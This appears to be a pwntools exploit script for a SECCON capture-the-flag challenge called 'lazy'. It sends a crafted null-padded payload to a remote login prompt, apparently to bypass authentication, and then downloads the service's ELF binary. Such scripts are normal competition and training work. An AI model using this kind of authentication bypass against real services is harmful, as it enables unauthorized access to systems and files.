#!/usr/bin/env python3

from pwn import *
context(arch="amd64", terminal=["tmux", "neww"])
#r = process("./a.out")

r = remote("lazy.chal.seccon.jp", 33333)

r.sendline(str(2)) # login
r.sendline(str(1)) # username

payload = b"aa" + b"\x00" * 30
payload += b"aa" + b"\x00" * 30
payload += b"aa" + b"\x00" * 30
payload += b"aa" + b"\x00" * 30

r.sendline(payload)
r.sendline(str(4)) # manage
r.sendline("lazy") # 
b = r.recvall()
p = b.find(b'\x7FELF')
if p != -1:
    with open("lazy", "wb") as f:
        f.write(b[p:])
    print("./lazy saved")
